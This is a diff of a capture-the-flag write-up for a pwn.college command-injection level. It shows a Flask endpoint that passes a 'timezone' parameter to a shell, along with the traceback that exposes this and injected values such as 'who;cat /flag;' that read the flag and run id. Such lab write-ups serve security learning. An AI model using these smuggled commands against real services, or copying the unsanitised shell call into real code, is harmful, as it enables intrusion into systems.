@@ -73,6 +73,8 @@ hacker@web-security-level-1:~$
 
 * In this challange we have to get the flag via Command injection...
 * This challange is bit tricky...
+* There is module in `python` named `subporcess` which can be used to execute the system commands with their fucntions like `run()` & `check_output()`...
+
 
 ```sh
 # for a normal curl request it shows like shoem kind of timezone...
@@ -87,8 +89,32 @@ Tue Apr 25 09:28:55 whoami 2023
 
 # After emum ... 
 # After curl i tried with the Python Request module..
+# Here we are changing the aprameter timezone, then it reflect in output...
+# when i use single quote (') like => ( url = "http://challenge.localhost:80?timezone=whoami ' " ) 
+# The response will be like :
+hacker@web-security-level-2:~$ python3 web-security/file.py 
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.8/dist-packages/flask/app.py", line 1823, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.8/dist-packages/flask/app.py", line 1799, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+  File "/challenge/run", line 670, in catch_all
+    return challenge()
+  File "/challenge/run", line 81, in level2
+    return subprocess.check_output(f"TZ={timezone} date", shell=True, encoding="latin")
+  File "/usr/lib/python3.8/subprocess.py", line 415, in check_output
+    return run(*popenargs, stdout=PIPE, timeout=timeout, check=True,
+  File "/usr/lib/python3.8/subprocess.py", line 516, in run
+    raise CalledProcessError(retcode, process.args,
+subprocess.CalledProcessError: Command 'TZ=whoami '  date' returned non-zero exit status 2.
+
+# here we can see that there is an error that tells more about the pareameter which we are using..
+# There is a paramater (timezone) and after that we have command `date` executing...
+# when we using the semicolon with (;command-here;) it executes commands...
+
 ```
-> The flag Request which we are using...
+
+> The Request which we are using to get the flag...
 
 ```py
 url = "http://challenge.localhost:80?timezone=who;cat /flag;"
@@ -96,15 +122,23 @@ data = {"Cookie": "c61b7eb3605bc2a2fdbbcac920bdd414"}
 response = re.post(url , data=data )
 print(response.text)
 ```
-> Response
+> Response 
 ```sh
 hacker@web-security-level-2:~$ python3 web-security/file.py 
 uid=0(root) gid=1000(hacker) groups=1000(hacker)
 Sat Apr 29 07:53:33 UTC 2023
 
 hacker@web-security-level-2:~$ python3 web-security/file.py 
-pwn.college{MyTKOEkbBTp0TjGsI6YLcxTh7W2.0FO4MzMsEDM3czW}
+pwn.college{falg_here}
 Sat Apr 29 07:54:22 UTC 2023
+```
+
+```sh
+# we can also execute the command with curl 
+
+hacker@web-security-level-2:~$ curl --path-as-is http://challenge.localhost:80?timezone=whoami;id; 
+Sat Apr 29 08:17:17 whoami 2023
+uid=1000(hacker) gid=1000(hacker) groups=1000(hacker)
 
 ```
 
